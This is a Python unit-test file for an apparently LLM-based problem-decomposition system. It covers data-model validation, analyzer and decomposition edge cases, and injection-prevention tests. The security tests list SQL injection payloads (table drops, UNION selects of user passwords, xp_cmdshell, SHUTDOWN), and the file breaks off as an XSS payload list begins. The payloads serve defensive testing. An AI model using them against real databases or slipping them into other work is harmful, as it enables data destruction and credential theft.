"""
Ultra-Comprehensive Unit Tests for Sovereign-Grade System
Deep component testing with extensive edge cases and failure scenarios
"""

import unittest
from unittest.mock import Mock, patch, MagicMock, call
import json
import time
import threading
import asyncio
import concurrent.futures
import inspect
import gc
import tracemalloc
import sys
import os
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Set
import random
import string
import tempfile
import sqlite3
import uuid

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from sovereign_data_models import (
    ProblemDefinition, SubProblem, DecompositionPlan, SolutionAttempt,
    Constraint, SuccessCriterion, DomainContext, ComplexityScore,
    ProblemType, SubProblemType, PlanStatus, generate_id
)
from problem_analyzer import ProblemAnalyzer
from decomposition_engine import DecompositionEngine
from sovereign_team_coordination import TeamCoordinator
from sovereign_solution_orchestration import SolutionOrchestrator
from sovereign_persistence import SovereignDatabase
from auth_system import AuthenticationSystem, AuthorizationSystem
from input_validation import InputValidator
from performance_optimization import LLMResponseCache
from advanced_features import AdvancedFeaturesManager
from monitoring_system import MetricsCollector


class TestComprehensiveDataModelValidation(unittest.TestCase):
    """Comprehensive validation of data models with edge cases"""
    
    def test_problem_definition_comprehensive_validation(self):
        """Test comprehensive validation of ProblemDefinition"""
        # Test with minimal valid data
        minimal_problem = ProblemDefinition(
            id=generate_id("valid"),
            title="Valid Problem",
            description="This is a valid problem definition",
            problem_type=ProblemType.RESEARCH,
            domain_context=DomainContext(domain="software_engineering"),
            complexity_score=ComplexityScore(
                explanation="Test complexity",
                cognitive_complexity=5.0,
                computational_complexity=5.0,
                domain_complexity=5.0,
                integration_complexity=5.0,
                overall_complexity=5.0
            )
        )
        
        # This should be valid
        validation_errors = minimal_problem.validate()
        self.assertEqual(len(validation_errors), 0, f"Minimal valid problem had errors: {validation_errors}")
        
        # Test with maximum length strings
        long_title = "A" * 500
        long_description = "B" * 10000
        long_domain = "C" * 100
        
        large_problem = ProblemDefinition(
            id=generate_id("large"),
            title=long_title,
            description=long_description,
            problem_type=ProblemType.RESEARCH,
            domain_context=DomainContext(domain=long_domain),
            complexity_score=ComplexityScore(
                explanation="Large content test",
                cognitive_complexity=7.5,
                computational_complexity=7.0,
                domain_complexity=8.0,
                integration_complexity=6.5,
                overall_complexity=7.3
            )
        )
        
        large_errors = large_problem.validate()
        self.assertEqual(len(large_errors), 0, f"Large content problem had validation errors: {large_errors}")
        
        # Test with invalid enum values
        with self.assertRaises(ValueError):
            ProblemDefinition(
                id=generate_id("invalid"),
                title="Invalid Enum Test",
                description="Testing invalid enums",
                problem_type="INVALID_ENUM_VALUE",  # This should cause validation error
                domain_context=DomainContext(domain="test"),
                complexity_score=ComplexityScore(
                    explanation="Invalid test",
                    cognitive_complexity=5.0,
                    computational_complexity=5.0,
                    domain_complexity=5.0,
                    integration_complexity=5.0,
                    overall_complexity=5.0
                )
            )
    
    def test_complexity_score_comprehensive_validation(self):
        """Test ComplexityScore with comprehensive edge cases"""
        # Test valid ranges
        valid_score = ComplexityScore(
            explanation="Valid range test",
            cognitive_complexity=10.0,
            computational_complexity=10.0,
            domain_complexity=10.0,
            integration_complexity=10.0,
            overall_complexity=10.0
        )
        self.assertEqual(valid_score.cognitive_complexity, 10.0)
        
        # Test lower boundary
        min_score = ComplexityScore(
            explanation="Min boundary test",
            cognitive_complexity=0.0,
            computational_complexity=0.0,
            domain_complexity=0.0,
            integration_complexity=0.0,
            overall_complexity=0.0
        )
        self.assertEqual(min_score.cognitive_complexity, 0.0)
        
        # Test edge cases near boundaries
        near_max_score = ComplexityScore(
            explanation="Near max test",
            cognitive_complexity=9.99,
            computational_complexity=9.99,
            domain_complexity=9.99,
            integration_complexity=9.99,
            overall_complexity=9.99
        )
        self.assertLess(near_max_score.cognitive_complexity, 10.0)
        
        near_min_score = ComplexityScore(
            explanation="Near min test", 
            cognitive_complexity=0.01,
            computational_complexity=0.01,
            domain_complexity=0.01,
            integration_complexity=0.01,
            overall_complexity=0.01
        )
        self.assertGreater(near_min_score.cognitive_complexity, 0.0)
        
        # Test with floats vs integers
        float_score = ComplexityScore(
            explanation="Float test",
            cognitive_complexity=7.77,
            computational_complexity=6.66,
            domain_complexity=8.88,
            integration_complexity=5.55,
            overall_complexity=7.22
        )
        self.assertAlmostEqual(float_score.cognitive_complexity, 7.77, places=2)
        
        # Test validation method
        valid_errors = valid_score.validate()
        self.assertEqual(len(valid_errors), 0)
        
        min_errors = min_score.validate()
        self.assertEqual(len(min_errors), 0)
    
    def test_constraint_validation_comprehensive(self):
        """Test Constraint validation with all possible combinations"""
        # Valid constraint
        valid_constraint = Constraint(
            id=generate_id("valid"),
            description="Time constraint for completion",
            type="time",
            severity="hard",
            metadata={}
        )
        
        validation_errors = valid_constraint.validate()
        self.assertEqual(len(validation_errors), 0)
        
        # Test all valid types
        valid_types = ["time", "resource", "quality", "technical"]
        for constraint_type in valid_types:
            constraint = Constraint(
                id=generate_id("type_test"),
                description=f"Test for {constraint_type}",
                type=constraint_type,
                severity="hard",
                metadata={}
            )
            errors = constraint.validate()
            self.assertEqual(len(errors), 0, f"Valid constraint type {constraint_type} had validation errors: {errors}")
        
        # Test all valid severities
        valid_severities = ["hard", "soft"]
        for severity in valid_severities:
            constraint = Constraint(
                id=generate_id("severity_test"),
                description=f"Test for {severity}",
                type="time",
                severity=severity,
                metadata={}
            )
            errors = constraint.validate()
            self.assertEqual(len(errors), 0, f"Valid severity {severity} had validation errors: {errors}")
        
        # Test invalid type
        invalid_type_constraint = Constraint(
            id=generate_id("invalid_test"),
            description="Invalid type test",
            type="invalid_type",
            severity="hard",
            metadata={}
        )
        
        invalid_type_errors = invalid_type_constraint.validate()
        self.assertGreater(len(invalid_type_errors), 0)
        self.assertIn("type", invalid_type_errors[0].lower())
        
        # Test invalid severity
        invalid_severity_constraint = Constraint(
            id=generate_id("invalid_severity"),
            description="Invalid severity test",
            type="time",
            severity="invalid_severity",
            metadata={}
        )
        
        invalid_severity_errors = invalid_severity_constraint.validate()
        self.assertGreater(len(invalid_severity_errors), 0)
        self.assertIn("severity", invalid_severity_errors[0].lower())
        
        # Test with very long description
        long_description_constraint = Constraint(
            id=generate_id("long_desc"),
            description="X" * 5000,
            type="resource",
            severity="soft",
            metadata={}
        )
        
        long_desc_errors = long_description_constraint.validate()
        # This should not cause validation errors based on length alone
        # (unless there's a length restriction that wasn't in the original model)
        self.assertEqual(len(long_desc_errors), 0)
    
    def test_success_criterion_comprehensive_validation(self):
        """Test SuccessCriterion with comprehensive validation"""
        # Valid success criterion
        valid_criterion = SuccessCriterion(
            id=generate_id("valid"),
            description="Solution must achieve 95% accuracy",
            metric="accuracy",
            threshold=0.95,
            validation_method="automated",
            metadata={}
        )
        
        validation_errors = valid_criterion.validate()
        self.assertEqual(len(validation_errors), 0)
        
        # Test boundary values for threshold
        # Test with exact 0.0 (minimum)
        zero_threshold = SuccessCriterion(
            id=generate_id("zero_threshold"),
            description="Zero threshold test",
            metric="coverage",
            threshold=0.0,
            validation_method="automated",
            metadata={}
        )
        
        zero_errors = zero_threshold.validate()
        self.assertEqual(len(zero_errors), 0)
        
        # Test with exact 1.0 (maximum)
        one_threshold = SuccessCriterion(
            id=generate_id("one_threshold"),
            description="One threshold test",
            metric="precision",
            threshold=1.0,
            validation_method="automated",
            metadata={}
        )
        
        one_errors = one_threshold.validate()
        self.assertEqual(len(one_errors), 0)
        
        # Test with values in between
        mid_threshold = SuccessCriterion(
            id=generate_id("mid_threshold"),
            description="Mid threshold test",
            metric="recall",
            threshold=0.75,
            validation_method="manual",
            metadata={}
        )
        
        mid_errors = mid_threshold.validate()
        self.assertEqual(len(mid_errors), 0)
        
        # Test with various metric types
        valid_metrics = ["accuracy", "precision", "recall", "f1_score", "coverage", "performance", "reliability", "security"]
        for metric in valid_metrics:
            criterion = SuccessCriterion(
                id=generate_id("metric_test"),
                description=f"Test for {metric}",
                metric=metric,
                threshold=0.8,
                validation_method="automated",
                metadata={}
            )
            
            errors = criterion.validate()
            self.assertEqual(len(errors), 0, f"Valid metric {metric} had validation errors: {errors}")
        
        # Test invalid thresholds
        invalid_thresholds = [-0.1, 1.1, -5.0, 10.0]
        for invalid_threshold in invalid_thresholds:
            invalid_criterion = SuccessCriterion(
                id=generate_id("invalid_threshold"),
                description=f"Invalid threshold: {invalid_threshold}",
                metric="accuracy",
                threshold=invalid_threshold,
                validation_method="automated",
                metadata={}
            )
            
            errors = invalid_criterion.validate()
            self.assertGreater(len(errors), 0, f"Invalid threshold {invalid_threshold} should have validation errors")
            self.assertIn("threshold", errors[0].lower())
    
    def test_sub_problem_comprehensive_validation(self):
        """Test SubProblem validation with comprehensive scenarios"""
        # Valid sub-problem
        valid_sub = SubProblem(
            id=generate_id("valid"),
            parent_id=generate_id("parent"),
            title="Valid Sub-Problem",
            description="This is a valid sub-problem for testing",
            type=SubProblemType.ANALYSIS,
            complexity_score=ComplexityScore(
                explanation="Valid sub-problem test",
                cognitive_complexity=6.0,
                computational_complexity=5.5,
                domain_complexity=6.5,
                integration_complexity=5.0,
                overall_complexity=5.8
            ),
            dependencies=[],
            success_criteria=[],
            validation_gauntlet="standard",
            assigned_team="red_team",
            estimated_effort=8,
            priority=7,
            status=SubProblemStatus.PENDING
        )
        
        validation_errors = valid_sub.validate()
        self.assertEqual(len(validation_errors), 0)
        
        # Test with dependencies
        sub_with_deps = SubProblem(
            id=generate_id("with_deps"),
            parent_id=generate_id("parent2"),
            title="Sub-problem with Dependencies",
            description="Sub-problem that has dependencies",
            type=SubProblemType.IMPLEMENTATION,
            complexity_score=ComplexityScore(
                explanation="Dependency test",
                cognitive_complexity=7.0,
                computational_complexity=6.0,
                domain_complexity=7.5,
                integration_complexity=6.5,
                overall_complexity=6.8
            ),
            dependencies=[generate_id("dep1"), generate_id("dep2"), generate_id("dep3")],
            success_criteria=[
                SuccessCriterion(
                    id=generate_id("crit1"),
                    description="Must complete within time",
                    metric="time",
                    threshold=0.9,
                    validation_method="automated"
                )
            ],
            validation_gauntlet="adaptive",
            assigned_team="blue_team",
            estimated_effort=24,
            priority=8,
            status=SubProblemStatus.IN_PROGRESS
        )
        
        deps_errors = sub_with_deps.validate()
        self.assertEqual(len(deps_errors), 0)
        
        # Test with maximum possible values
        max_dependencies = [generate_id(f"max_dep_{i}") for i in range(50)]
        
        max_sub = SubProblem(
            id=generate_id("max_test"),
            parent_id=generate_id("max_parent"),
            title="A" * 200,  # Long title
            description="B" * 5000,  # Long description
            type=SubProblemType.VALIDATION,
            complexity_score=ComplexityScore(
                explanation="C" * 1000,  # Long explanation
                cognitive_complexity=9.9,
                computational_complexity=9.8,
                domain_complexity=9.7,
                integration_complexity=9.6,
                overall_complexity=9.75
            ),
            dependencies=max_dependencies[:20],  # Use first 20 to stay reasonable
            success_criteria=[
                SuccessCriterion(
                    id=generate_id("max_crit1"),
                    description="D" * 500,  # Long description
                    metric="performance",
                    threshold=0.99,
                    validation_method="automated"
                ),
                SuccessCriterion(
                    id=generate_id("max_crit2"),
                    description="E" * 500,  # Long description
                    metric="security",
                    threshold=0.95,
                    validation_method="manual"
                )
            ],
            validation_gauntlet="hierarchical",
            assigned_team="gold_team",
            estimated_effort=1000,  # High effort
            priority=10,  # Max priority
            status=SubProblemStatus.BLOCKED
        )
        
        max_errors = max_sub.validate()
        self.assertEqual(len(max_errors), 0)
    
    def test_decomposition_plan_comprehensive_validation(self):
        """Test DecompositionPlan with comprehensive scenarios"""
        # Create some sub-problems
        sub1 = SubProblem(
            id=generate_id("sub1"),
            parent_id=generate_id("plan_parent"),
            title="First Sub-problem",
            description="The first sub-problem in the plan",
            type=SubProblemType.ANALYSIS,
            complexity_score=ComplexityScore(
                explanation="First sub-problem",
                cognitive_complexity=5.0,
                computational_complexity=5.0,
                domain_complexity=5.0,
                integration_complexity=5.0,
                overall_complexity=5.0
            )
        )
        
        sub2 = SubProblem(
            id=generate_id("sub2"),
            parent_id=generate_id("plan_parent"),
            title="Second Sub-problem",
            description="The second sub-problem in the plan",
            type=SubProblemType.IMPLEMENTATION,
            complexity_score=ComplexityScore(
                explanation="Second sub-problem",
                cognitive_complexity=6.0,
                computational_complexity=6.0,
                domain_complexity=6.0,
                integration_complexity=6.0,
                overall_complexity=6.0
            ),
            dependencies=[sub1.id]  # Depends on first sub-problem
        )
        
        # Valid plan
        valid_plan = DecompositionPlan(
            id=generate_id("valid_plan"),
            problem_id=generate_id("plan_parent"),
            strategy="dependency",
            sub_problems=[sub1, sub2],
            dependency_graph={"sub2_id": ["sub1_id"]},  # Simplified for test
            validation_checkpoints=[],
            quality_scores={},
            confidence_level=0.85,
            created_by="test_user",
            approved_by=None,
            status=PlanStatus.DRAFT,
            created_at=datetime.now(),
            updated_at=datetime.now(),
            metadata={}
        )
        
        validation_errors = valid_plan.validate()
        self.assertEqual(len(validation_errors), 0)
        
        # Test plan with many sub-problems
        many_subs = []
        for i in range(50):
            sub = SubProblem(
                id=generate_id(f"many_subs_{i}"),
                parent_id=generate_id("many_parent"),
                title=f"Sub-problem {i}",
                description=f"Sub-problem number {i} in the many sub-problems test",
                type=random.choice(list(SubProblemType)),
                complexity_score=ComplexityScore(
                    explanation=f"Sub-problem {i}",
                    cognitive_complexity=5.0 + (i % 3),
                    computational_complexity=5.0 + (i % 3),
                    domain_complexity=5.0 + (i % 3),
                    integration_complexity=5.0 + (i % 3),
                    overall_complexity=5.0 + (i % 3)
                )
            )
            many_subs.append(sub)
        
        large_plan = DecompositionPlan(
            id=generate_id("large_plan"),
            problem_id=generate_id("large_parent"),
            strategy="complexity",
            sub_problems=many_subs,
            dependency_graph={},  # No dependencies for large plan test
            validation_checkpoints=[],
            quality_scores={"reliability": 0.9, "maintainability": 0.85, "performance": 0.92},
            confidence_level=0.78,
            created_by="test_user_large",
            approved_by="approver_large",
            status=PlanStatus.APPROVED,
            created_at=datetime.now(),
            updated_at=datetime.now(),
            metadata={"batch_id": "large_batch_test"}
        )
        
        large_errors = large_plan.validate()
        self.assertEqual(len(large_errors), 0)


class TestAnalyzerEdgeCases(unittest.TestCase):
    """Test analyzer with extreme edge cases"""
    
    def setUp(self):
        """Set up test fixtures"""
        with patch('problem_analyzer.OpenEvolveClient') as mock_openevolve:
            self.mock_client = mock_openevolve.return_value
            self.analyzer = ProblemAnalyzer(openevolve_client=self.mock_client)
    
    def test_extremely_long_problem_statements(self):
        """Test analyzer with extremely long problem statements"""
        # Create a very long problem statement (several thousand words)
        long_problem_text = "This is a very long problem statement. " * 1000  # 4000 words
        
        # Mock the OpenEvolve response
        mock_response = Mock()
        mock_response.success = True
        mock_response.best_code = json.dumps({
            "domain": "software_engineering",
            "subdomain": "natural_language_processing",
            "related_domains": ["ai", "ml", "data_science"],
            "key_concepts": ["text_analysis", "context_extraction", "entity_recognition"],
            "domain_complexity": 7.5,
            "required_expertise": ["nlp_engineer", "data_scientist"]
        })
        
        self.mock_client.evolve.return_value = mock_response
        
        start_time = time.time()
        
        # Analyze the long problem
        result = self.analyzer.analyze_problem(
            problem_text=long_problem_text,
            title="Extremely Long Problem Statement Analysis"
        )
        
        analysis_time = time.time() - start_time
        
        # Verify analysis completed successfully
        self.assertIsNotNone(result)
        self.assertIn("nlp", result.domain_context.domain.lower())
        
        # Analysis should complete in reasonable time despite long input
        self.assertLess(analysis_time, 10.0, "Long problem analysis took too long")
    
    def test_problem_with_malformed_text(self):
        """Test analyzer with malformed or unusual text"""
        malformed_texts = [
            "",  # Empty string
            "   \n\t\r   ",  # Whitespace only
            "áéíóú ñç 中文 日本語 русский عربى",  # Various character encodings
            "!@#$%^&*()" * 100,  # Special characters only
            "A" * 100000,  # Extremely long single character string
            "Line 1\nLine 2\nLine 3\n" * 5000,  # Many newlines
            "HTTP://MALFORMED.URL<SCRIPT>ALERT('XSS')</SCRIPT>",  # Potential security issues
        ]
        
        for i, malformed_text in enumerate(malformed_texts):
            with self.subTest(text_index=i):
                # Mock response for malformed text
                mock_response = Mock()
                mock_response.success = True
                mock_response.best_code = json.dumps({
                    "domain": "general",
                    "subdomain": "text_processing",
                    "related_domains": ["linguistics"],
                    "key_concepts": ["text_normalization", "character_encoding"],
                    "domain_complexity": 3.0,
                    "required_expertise": ["text_processor"]
                })
                
                self.mock_client.evolve.return_value = mock_response
                
                try:
                    result = self.analyzer.analyze_problem(
                        problem_text=malformed_text,
                        title=f"Malsormed Text Test {i}"
                    )
                    # Should handle gracefully with basic analysis
                    self.assertIsNotNone(result)
                except Exception as e:
                    # If it fails, it should be an expected exception, not a crash
                    self.assertIn("error", str(e).lower())
    
    def test_problem_with_code_snippets(self):
        """Test analyzer with problems that contain code snippets"""
        problem_with_code = """
        Analyze the following Python code for performance issues and suggest optimizations:

        def fibonacci(n):
            if n <= 1:
                return n
            return fibonacci(n-1) + fibonacci(n-2)

        result = fibonacci(35)
        print(result)

        The function works but is extremely inefficient. How can we optimize it?
        """
        
        # Mock OpenEvolve response
        mock_response = Mock()
        mock_response.success = True
        mock_response.best_code = json.dumps({
            "domain": "software_engineering",
            "subdomain": "performance_optimization",
            "related_domains": ["algorithm_analysis", "complexity_theory"],
            "key_concepts": ["recursion", "dynamic_programming", "memoization", "time_complexity"],
            "domain_complexity": 8.0,
            "required_expertise": ["algorithms", "performance_specialist"]
        })
        
        self.mock_client.evolve.return_value = mock_response
        
        result = self.analyzer.analyze_problem(
            problem_text=problem_with_code,
            title="Code Analysis Problem"
        )
        
        self.assertIsNotNone(result)
        self.assertIn("performance", result.domain_context.domain.lower())
        self.assertIn("algorithm", result.domain_context.related_domains)
    
    def test_multilingual_problem_analysis(self):
        """Test analyzer with multilingual problems"""
        multilingual_problems = [
            ("Analyse this French problem: Problème d'optimisation algorithmique", "French"),
            ("Analiza este problema en español: Problema de análisis de datos", "Spanish"), 
            ("この日本語の問題を分析してください：アルゴリズムの最適化", "Japanese"),
            ("Анализируйте эту русскую задачу: Оптимизация алгоритма", "Russian"),
            ("把这个中文问题分析一下：算法优化问题", "Chinese")
        ]
        
        for problem_text, language in multilingual_problems:
            with self.subTest(language=language):
                mock_response = Mock()
                mock_response.success = True
                mock_response.best_code = json.dumps({
                    "domain": "software_engineering" if language in ["French", "Spanish"] else "algorithm_analysis",
                    "subdomain": "optimization",
                    "related_domains": ["internationalization"],
                    "key_concepts": ["multilingual_processing", "localization"],
                    "domain_complexity": 6.0,
                    "required_expertise": ["multilingual_analyst", "domain_expert"]
                })
                
                self.mock_client.evolve.return_value = mock_response
                
                result = self.analyzer.analyze_problem(
                    problem_text=problem_text,
                    title=f"Multilingual Problem Analysis - {language}"
                )
                
                self.assertIsNotNone(result)
                self.assertIn("optimization", result.domain_context.subdomain.lower())


class TestDecompositionEngineEdgeCases(unittest.TestCase):
    """Test decomposition engine with edge cases"""
    
    def setUp(self):
        """Set up test fixtures"""
        with patch('decomposition_engine.OpenEvolveClient') as mock_openevolve:
            self.mock_client = mock_openevolve.return_value
            self.engine = DecompositionEngine(openevolve_client=self.mock_client)
    
    def test_decompose_extremely_complex_problem(self):
        """Test decomposition of extremely complex problems"""
        complex_problem = ProblemDefinition(
            id=generate_id("complex"),
            title="Extremely Complex Multi-Domain System Design",
            description="Design a globally distributed, fault-tolerant, secure, and highly available system that integrates artificial intelligence, blockchain technology, quantum-safe cryptography, real-time analytics, machine learning, microservices architecture, and provides seamless user experience across 100+ countries with different regulations, languages, currencies, and cultural norms. The system must handle 1 billion+ users, process 1 million+ transactions per second, maintain 99.999% uptime, ensure GDPR compliance, support offline functionality, provide real-time synchronization, handle intermittent connectivity, offer multiple authentication methods, enforce fine-grained access controls, prevent all known attack vectors, provide quantum-resistant security, and maintain consistent performance across all regions.",
            problem_type=ProblemType.RESEARCH,
            domain_context=DomainContext(domain="multi_domain_integration"),
            complexity_score=ComplexityScore(
                explanation="Extremely complex multi-domain problem",
                cognitive_complexity=9.8,
                computational_complexity=9.9,
                domain_complexity=9.7,
                integration_complexity=9.9,
                overall_complexity=9.8
            )
        )
        
        # Mock decomposition response for complex problem
        mock_response = Mock()
        mock_response.success = True
        mock_response.best_code = json.dumps([
            {
                "id": generate_id("complex_sub1"),
                "description": "Quantum-safe cryptography implementation research",
                "dependencies": [],
                "ai_suggested_complexity_score": 9.5,
                "ai_suggested_evaluation_prompt": "Validate quantum resistance and implementation feasibility"
            },
            {
                "id": generate_id("complex_sub2"),
                "description": "Blockchain consensus mechanism optimization",
                "dependencies": [generate_id("complex_sub1")],
                "ai_suggested_complexity_score": 9.2,
                "ai_suggested_evaluation_prompt": "Verify consensus efficiency and security"
            },
            {
                "id": generate_id("complex_sub3"), 
                "description": "Distributed system architecture design",
                "dependencies": [generate_id("complex_sub1"), generate_id("complex_sub2")],
                "ai_suggested_complexity_score": 9.6,
                "ai_suggested_evaluation_prompt": "Validate system design and fault tolerance"
            },
            {
                "id": generate_id("complex_sub4"),
                "description": "Real-time analytics pipeline implementation",
                "dependencies": [generate_id("complex_sub3")],
                "ai_suggested_complexity_score": 8.8,
                "ai_suggested_evaluation_prompt": "Check processing performance and accuracy"
            },
            {
                "id": generate_id("complex_sub5"),
                "description": "AI/ML model integration and training",
                "dependencies": [generate_id("complex_sub4")],
                "ai_suggested_complexity_score": 9.0,
                "ai_suggested_evaluation_prompt": "Validate model performance and bias prevention"
            },
            {
                "id": generate_id("complex_sub6"),
                "description": "Global compliance and regulation framework",
                "dependencies": [],
                "ai_suggested_complexity_score": 9.4,
                "ai_suggested_evaluation_prompt": "Verify regulatory compliance across jurisdictions"
            },
            {
                "id": generate_id("complex_sub7"),
                "description": "Multi-language and cultural adaptation",
                "dependencies": [generate_id("complex_sub6")],
                "ai_suggested_complexity_score": 8.5,
                "ai_suggested_evaluation_prompt": "Validate localization and cultural sensitivity"
            },
            {
                "id": generate_id("complex_sub8"),
                "description": "Offline synchronization and connectivity management",
                "dependencies": [generate_id("complex_sub3")],
                "ai_suggested_complexity_score": 8.7,
                "ai_suggested_evaluation_prompt": "Test offline functionality and sync reliability"
            }
        ])
        
        self.mock_client.evolve.return_value = mock_response
        
        start_time = time.time()
        
        # Decompose the complex problem
        plan = self.engine.decompose(complex_problem, strategy="hybrid")
        
        decomposition_time = time.time() - start_time
        
        self.assertIsNotNone(plan)
        self.assertGreater(len(plan.sub_problems), 5)  # Should create multiple sub-problems
        self.assertLess(decomposition_time, 15.0)  # Should complete in reasonable time
        
        # Verify dependencies were properly mapped
        sub_problem_ids = [sp.id for sp in plan.sub_problems]
        for sub in plan.sub_problems:
            for dep_id in sub.dependencies:
                self.assertIn(dep_id, sub_problem_ids, f"Dependency {dep_id} not in plan for sub-problem {sub.id}")
    
    def test_decompose_minimal_problem(self):
        """Test decomposition of minimal/simple problems"""
        simple_problem = ProblemDefinition(
            id=generate_id("simple"),
            title="Simple Problem",
            description="Just make a small change to this simple thing",
            problem_type=ProblemType.IMPLEMENTATION,
            domain_context=DomainContext(domain="simple_task"),
            complexity_score=ComplexityScore(
                explanation="Very simple problem",
                cognitive_complexity=1.0,
                computational_complexity=1.0,
                domain_complexity=1.0,
                integration_complexity=1.0,
                overall_complexity=1.0
            )
        )
        
        # Mock simple decomposition response
        mock_response = Mock()
        mock_response.success = True
        mock_response.best_code = json.dumps([
            {
                "id": generate_id("simple_sub1"),
                "description": "Make the small change",
                "dependencies": [],
                "ai_suggested_complexity_score": 2.0,
                "ai_suggested_evaluation_prompt": "Verify the change was made correctly"
            }
        ])
        
        self.mock_client.evolve.return_value = mock_response
        
        plan = self.engine.decompose(simple_problem, strategy="simple")
        
        self.assertIsNotNone(plan)
        self.assertEqual(len(plan.sub_problems), 1)
        self.assertIn("small change", plan.sub_problems[0].description.lower())
    
    def test_decomposition_with_circular_dependencies(self):
        """Test handling of problems that might create circular dependencies"""
        problem = ProblemDefinition(
            id=generate_id("circular_test"),
            title="Circular Dependency Test",
            description="Problem that might create circular dependencies in decomposition",
            problem_type=ProblemType.RESEARCH,
            domain_context=DomainContext(domain="dependency_analysis"),
            complexity_score=ComplexityScore(
                explanation="Test circular dependency detection",
                cognitive_complexity=7.0,
                computational_complexity=7.0,
                domain_complexity=7.0,
                integration_complexity=7.0,
                overall_complexity=7.0
            )
        )
        
        # Mock response that attempts to create circular dependencies
        mock_response = Mock()
        mock_response.success = True
        mock_response.best_code = json.dumps([
            {
                "id": generate_id("circ1"),
                "description": "First component that depends on second",
                "dependencies": [generate_id("circ2")],  # Points to circ2
                "ai_suggested_complexity_score": 6.0,
                "ai_suggested_evaluation_prompt": "Validate first component"
            },
            {
                "id": generate_id("circ2"),
                "description": "Second component that depends on first", 
                "dependencies": [generate_id("circ1")],  # Points back to circ1 - circular!
                "ai_suggested_complexity_score": 6.0,
                "ai_suggested_evaluation_prompt": "Validate second component"
            },
            {
                "id": generate_id("independent"),
                "description": "Independent component",
                "dependencies": [],  # No dependencies
                "ai_suggested_complexity_score": 5.0,
                "ai_suggested_evaluation_prompt": "Validate independent component"
            }
        ])
        
        self.mock_client.evolve.return_value = mock_response
        
        # This should either handle circular dependencies gracefully or detect them
        plan = self.engine.decompose(problem, strategy="dependency")
        
        self.assertIsNotNone(plan)
        
        # The system should either break the cycle or flag it as an issue
        # Check for cycle detection in the validation
        from decomposition_engine import validate_dependencies
        errors = validate_dependencies(plan.sub_problems)
        
        # Look for circular dependency errors
        circular_errors = [e for e in errors if "circular" in e.lower()]
        
        # The dependency validation should detect and report circular dependencies
        self.assertGreater(len(circular_errors), 0, f"Should detect circular dependencies, but got errors: {errors}")
    
    def test_decomposition_strategy_selection(self):
        """Test selection of different decomposition strategies"""
        problem = ProblemDefinition(
            id=generate_id("strategy_test"),
            title="Strategy Selection Test",
            description="Problem to test different decomposition strategies",
            problem_type=ProblemType.RESEARCH,
            domain_context=DomainContext(domain="strategy_testing"),
            complexity_score=ComplexityScore(
                explanation="Strategy test problem",
                cognitive_complexity=5.0,
                computational_complexity=5.0,
                domain_complexity=5.0,
                integration_complexity=5.0,
                overall_complexity=5.0
            )
        )
        
        strategies_to_test = [
            "semantic", "dependency", "complexity", 
            "research", "hybrid", "custom", "algorithmic"
        ]
        
        for strategy in strategies_to_test:
            with self.subTest(strategy=strategy):
                # Mock different responses for different strategies
                mock_response = Mock()
                mock_response.success = True
                mock_response.best_code = json.dumps([
                    {
                        "id": generate_id(f"{strategy}_sub1"),
                        "description": f"Sub-problem for {strategy} strategy",
                        "dependencies": [],
                        "ai_suggested_complexity_score": 5.0,
                        "ai_suggested_evaluation_prompt": f"Validate {strategy} strategy decomposition"
                    }
                ])
                
                self.mock_client.evolve.return_value = mock_response
                
                plan = self.engine.decompose(problem, strategy=strategy)
                
                self.assertIsNotNone(plan, f"Strategy {strategy} should return a plan")
                self.assertGreater(len(plan.sub_problems), 0, f"Strategy {strategy} should create sub-problems")
                self.assertEqual(plan.strategy, strategy, f"Plan strategy should match requested strategy: {strategy}")


class TestAdvancedSecurityScenarios(unittest.TestCase):
    """Test advanced security scenarios and injection attempts"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.auth_system = AuthenticationSystem(db_path=":memory:")
        self.validator = InputValidator()
    
    def test_sql_injection_attempts_various_forms(self):
        """Test various SQL injection attempts"""
        db = SovereignDatabase(":memory:")
        
        # Set up test problem to try injection attacks on
        test_problem = ProblemDefinition(
            id=generate_id("injection_test"),
            title="Injection Test Problem",
            description="Problem for testing injection prevention",
            problem_type=ProblemType.RESEARCH,
            domain_context=DomainContext(domain="security_test"),
            complexity_score=ComplexityScore(
                explanation="Injection test",
                cognitive_complexity=5.0,
                computational_complexity=5.0,
                domain_complexity=5.0,
                integration_complexity=5.0,
                overall_complexity=5.0
            )
        )
        
        # Store initial problem
        result = db.create_problem(test_problem)
        self.assertTrue(result)
        
        injection_attempts = [
            # Classic SQL injection
            "'; DROP TABLE problems; --",
            "'; UPDATE problems SET title='hacked' WHERE 1=1; --",
            "' OR '1'='1",
            "' OR 1=1 --",
            
            # Union-based injection
            "' UNION SELECT 1,2,3,4,5 --",
            "' UNION SELECT password, username, email FROM users --",
            
            # Time-based blind injection
            "'; WAITFOR DELAY '00:00:05' --",
            "'; SELECT SLEEP(5); --",
            
            # Boolean-based injection  
            "' AND 1=1 --",
            "' AND 1=2 --",
            
            # Stack queries
            "'; EXEC xp_cmdshell('dir'); --",
            "'; SHUTDOWN; --",
            
            # Comment-based bypasses
            "'; /**/ DROP /**/ TABLE /**/ problems; --",
            "' OR /*!12345=12345*/ --",
        ]
        
        for injection in injection_attempts:
            with self.subTest(injection=injection):
                # Create problem with injection attempt in title
                inj_problem = ProblemDefinition(
                    id=generate_id("inj_test"),
                    title=f"Safe Title {injection}",
                    description="Test description",
                    problem_type=ProblemType.RESEARCH,
                    domain_context=DomainContext(domain="security_test"),
                    complexity_score=ComplexityScore(
                        explanation="Injection test",
                        cognitive_complexity=5.0,
                        computational_complexity=5.0,
                        domain_complexity=5.0,
                        integration_complexity=5.0,
                        overall_complexity=5.0
                    )
                )
                
                # This should handle the injection safely without executing it
                try:
                    result = db.create_problem(inj_problem)
                    # Either it should fail safely or succeed but with sanitized title
                    # The important thing is that no SQL was executed
                    self.assertTrue(result is not False)  # Should not return False for injection issues
                except Exception:
                    # If it throws an exception during validation, that's also acceptable
                    pass
                
                # Verify the problems table still exists and has valid data
                all_problems = db.list_problems()
                self.assertGreaterEqual(len(all_problems), 1, f"Table should still exist after injection attempt: {injection}")
                
                # Verify specific tables still exist
                tables = db.conn.execute("SELECT name FROM sqlite_master WHERE type='table';").fetchall()
                table_names = {t[0] for t in tables}
                self.assertIn('problems', table_names, f"Critical table 'problems' should exist after injection: {injection}")
    
    def test_xss_prevention_comprehensive(self):
        """Test comprehensive XSS prevention"""
        xss_payloads = [
            # Script tags
            '<script>alert("xss")</script>',
